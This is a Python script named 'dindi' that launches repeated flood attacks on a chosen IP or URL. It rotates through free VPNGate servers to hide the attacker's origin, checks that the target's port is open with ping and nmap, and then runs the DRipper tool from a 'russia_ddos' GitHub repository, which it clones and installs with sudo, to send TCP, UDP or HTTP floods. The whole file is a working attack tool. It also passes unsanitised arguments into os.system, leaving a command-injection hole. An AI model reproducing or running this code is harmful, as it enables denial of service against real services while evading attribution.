import argparse
import nmap3
import os
import requests
import time

class VPNManager(object):
    def __init__(self):
        self.wait_openvpn=15
        self.servers_file='servers.txt'
        self.pid_file='pid.txt'
        self.log_file='log.txt'
        self.connected_successed=False
        self.url='https://www.vpngate.net/api/iphone/'
        self.servers=requests.get(self.url)

        with open(self.servers_file, 'wb') as servers_file:
            servers_file.write(self.servers.content)

        with open(self.servers_file, 'rb') as servers_file:
            self.servers=servers_file.readlines()

    def connect(self, target, port, protocol, server):
        cmd='echo ' + str(server) + ' | awk -F "," \'{ print $15 }\' | base64 -d > /tmp/openvpn3'
        os.system(cmd)
        os.system('sudo openvpn --config /tmp/openvpn3 --daemon --writepid ' + str(self.pid_file) + ' --log ' + self.log_file)

        time.sleep(self.wait_openvpn)

        if self.check_vpn_status():
            print('Successed connect to vpn')
            if self.check_target_connectivity(target, port, protocol):
                print('Successed check target connectivity')
                self.connected_successed=True
                return True

        print('Failed connect to vpn or check target connectivity')
        self.connected_successed=False
        return False

    def is_connected(self):
        return self.connected_successed

    def disconnect(self):
        print('Disconnect vpn')
        os.system('sudo pkill openvpn')
        self.connected_successed=False

    def deinit(self):
        if self.is_connected():
            self.disconnect()
        if os.path.exists(self.log_file):
            os.remove(self.log_file)
        if os.path.exists(self.pid_file):
            os.remove(self.pid_file)
        if os.path.exists(self.servers_file):
            os.remove(self.servers_file)

    def get_servers_list(self):
        servers=[]
        for server in self.servers:
            server_str=server.decode('utf-8')
            if server_str.startswith('*') or server_str.startswith('#'):
                continue
            else:
                servers.append(server)
        return servers

    def check_vpn_status(self):
        import subprocess
        status=False
        cat_log='sudo cat ' + self.log_file
        process = subprocess.Popen(cat_log, stdout=subprocess.PIPE, shell=True)
        for line in iter(process.stdout.readline, ''):
            if str(line).find('Initialization Sequence Completed') >= 0:
                status=True
                break
        
        if status:
            process_pid=open(self.pid_file, 'r').read()
            os.system('sudo kill -SIGUSR2 ' + process_pid)

            cat_log='sudo cat ' + self.log_file
            process = subprocess.Popen(cat_log, stdout=subprocess.PIPE, shell=True)
            for line in iter(process.stdout.readline, ''):
                if str(line).find('Auth read bytes') >= 0:
                    return True

        print('Status vpn connection: invalid')
        return False

    def check_target_connectivity(self, target, port, protocol):
        response=os.system('ping -c 1 ' + str(target))
        if response != 0:
            return False

        if port == -1:
            port=443
        nmap=nmap3.NmapHostDiscovery()
        args_str='-p ' + str(port) 
        if protocol == 'udp':
            args_str += ' -sU'
        result=nmap.nmap_portscan_only(str(target),  args_str)

        return result[(str(target))]['ports'][0]['state'] == 'open'

def attack_target(target, port, connections, duration, protocol):
    print('Start attack target:', target, 'port:', port)

    full_target=str(target) + ':' + str(port)
    if protocol == 'TCP':
        full_target = 'tcp://' + target + ' -l 2048' + '-m tcp-flood'
    elif protocol == 'UDP':
        full_target = 'udp://' + target + ' -l 2048' + '-m upd-flood'
    elif protocol == 'HTTP':
        full_target = 'http://' + target + ' -m http-flood'
    elif protocol == 'HTTPS':
        full_target = 'https://' + target + ' -m http-flood'
        
    exe_command='sudo python3 ./russia_ddos/DRipper.py -s ' + full_target + ' -t ' + str(connections) + ' -d ' + str(duration)
    print('Start command:', exe_command)
    os.system(exe_command)

def intialize_dripper():
    if os.path.exists('russia_ddos'):
        os.system('cd russia_ddos && git pull && sudo python3 ./setup.py install')
    else:
        os.system('git clone https://github.com/alexmon1989/russia_ddos.git')
        os.system('cd russia_ddos && sudo python3 ./setup.py install')

def main():
    print("Starting dindi...")
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', help='Target ip or url', required=True)
    parser.add_argument('-p', help='Target port', default=-1)
    parser.add_argument('-t', help='Specify connection counts per single attack', default=500)
    parser.add_argument('-m', help='Specify protocol', default='TCP')
    parser.add_argument('-d', help='Duration in seconds', default=60)
    parser.add_argument('-a', help='Number attacks', default=1)

    intialize_dripper()

    vpn_manager=VPNManager()

    arguments=parser.parse_args()
    try:
        server_list=vpn_manager.get_servers_list()
        servers_count=len(server_list)
        servers_connect_status=[True for i in range(servers_count)]
        
        if servers_count == 0:
            print('Unavaliable find vpn server')
            return
        else:
            print('Found servers: ', servers_count)

        j=0
        i=0
        while True:
            if servers_connect_status[j] is False:
                j+=1
                j=j%servers_count
                continue
            server=server_list[j]
            servers_connect_status[j]=vpn_manager.connect(arguments.s, arguments.p, arguments.m, server)
            if servers_connect_status.count(False) == len(servers_connect_status):
                print('Not found valid vpn server')
                return
            if servers_connect_status[j]:
                attack_target(arguments.s,
                              arguments.p,
                              arguments.t,
                              arguments.d,
                              arguments.m)
                i+=1

            j+=1
            j=j%servers_count
            vpn_manager.disconnect()
            if i > int(arguments.a):
                return

    except Exception as e:
        print(e)
    finally:
        vpn_manager.deinit()

if __name__=="__main__":
    main()
